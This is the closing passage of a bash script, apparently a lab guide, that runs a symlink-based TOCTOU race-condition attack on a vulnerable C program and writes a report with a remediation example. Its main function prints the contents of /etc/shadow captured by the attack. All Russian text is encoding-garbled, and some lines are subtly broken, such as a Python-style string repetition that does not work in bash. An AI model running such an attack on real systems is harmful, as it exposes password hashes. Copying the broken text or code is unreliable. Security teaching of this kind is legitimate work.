- –ú–Ω–æ–≥–æ–ø–æ—Ç–æ—á–Ω–æ—Å—Ç—å –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è race condition
- –°–∏–º–≤–æ–ª–∏—á–µ—Å–∫–∏–µ —Å—Å—ã–ª–∫–∏ –¥–ª—è –æ–±—Ö–æ–¥–∞ –ø—Ä–æ–≤–µ—Ä–æ–∫
- TOCTOU –∞—Ç–∞–∫–∞ –Ω–∞ —Ñ–∞–π–ª–æ–≤—É—é —Å–∏—Å—Ç–µ–º—É

–§–∞–π–ª—ã:
- –£—è–∑–≤–∏–º–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞: race_vulnerable.c
- –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –ø—Ä–∏–º–µ—Ä: safe_example.c
- –†–µ–∑—É–ª—å—Ç–∞—Ç –∞—Ç–∞–∫–∏: /tmp/race_success.txt

=== –ó–ê–ö–õ–Æ–ß–ï–ù–ò–ï ===

$(if [[ -f /tmp/race_success.txt ]]; then 
    echo "–ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø –£–Ø–ó–í–ò–ú–û–°–¢–¨ –û–ë–ù–ê–†–£–ñ–ï–ù–ê!"
    echo "–ù–µ–æ–±—Ö–æ–¥–∏–º–æ –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–æ–µ —É—Å—Ç—Ä–∞–Ω–µ–Ω–∏–µ."
    echo "–°–∏—Å—Ç–µ–º–∞ —É—è–∑–≤–∏–º–∞ –∫ race condition –∞—Ç–∞–∫–∞–º."
else
    echo "–£—è–∑–≤–∏–º–æ—Å—Ç—å –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞."
    echo "–°–∏—Å—Ç–µ–º–∞ –∑–∞—â–∏—â–µ–Ω–∞ –æ—Ç race condition –∞—Ç–∞–∫."
fi)

–û—Ç—á–µ—Ç —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏.
EOF
    
    log_success "–û—Ç—á–µ—Ç —Å–æ–∑–¥–∞–Ω: race_condition_report.txt"
    echo ""
}

# –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
main() {
    echo "üöÄ –ó–ê–ü–£–°–ö –ü–û–®–ê–ì–û–í–û–ì–û –ì–ê–ô–î–ê: RACE CONDITION –£–Ø–ó–í–ò–ú–û–°–¢–¨"
    echo "="*60
    echo ""
    
    # –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –≤—Å–µ—Ö —à–∞–≥–æ–≤
    step1_preparation
    step2_vulnerable_program
    step3_vulnerability_analysis
    step4_execute_attack
    step5_result_analysis
    step6_remediation
    step7_additional_tests
    step8_generate_report
    
    echo "‚úÖ –ü–û–®–ê–ì–û–í–´–ô –ì–ê–ô–î –ó–ê–í–ï–†–®–ï–ù"
    echo ""
    echo "üìÅ –°–æ–∑–¥–∞–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã:"
    echo "- race_vulnerable.c - –£—è–∑–≤–∏–º–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞"
    echo "- safe_example.c - –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –ø—Ä–∏–º–µ—Ä"
    echo "- race_condition_report.txt - –î–µ—Ç–∞–ª—å–Ω—ã–π –æ—Ç—á–µ—Ç"
    echo "- /tmp/race_success.txt - –†–µ–∑—É–ª—å—Ç–∞—Ç –∞—Ç–∞–∫–∏ (–µ—Å–ª–∏ —É—Å–ø–µ—à–Ω–∞)"
    echo ""
    
    # –í—ã–≤–æ–¥ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ –ø—Ä–æ—á–∏—Ç–∞–Ω–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ /etc/shadow
    if [[ -f /tmp/race_success.txt ]]; then
        echo "üîç –°–û–î–ï–†–ñ–ò–ú–û–ï –ü–†–û–ß–ò–¢–ê–ù–ù–û–ì–û –§–ê–ô–õ–ê /etc/shadow:"
        echo "="*60
        cat /tmp/race_success.txt
        echo "="*60
        echo ""
        log_exploit "–£–°–ü–ï–®–ù–û –ü–†–û–ß–ò–¢–ê–ù –§–ê–ô–õ /etc/shadow!"
    else
        echo "‚ùå –§–∞–π–ª /etc/shadow –Ω–µ –±—ã–ª –ø—Ä–æ—á–∏—Ç–∞–Ω"
    fi
    
    echo "üîç –î–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤:"
    echo "cat race_condition_report.txt"
    echo "cat /tmp/race_success.txt (–µ—Å–ª–∏ –∞—Ç–∞–∫–∞ —É–¥–∞–ª–∞—Å—å)"
}

# –ó–∞–ø—É—Å–∫ –æ—Å–Ω–æ–≤–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏
main "$@" 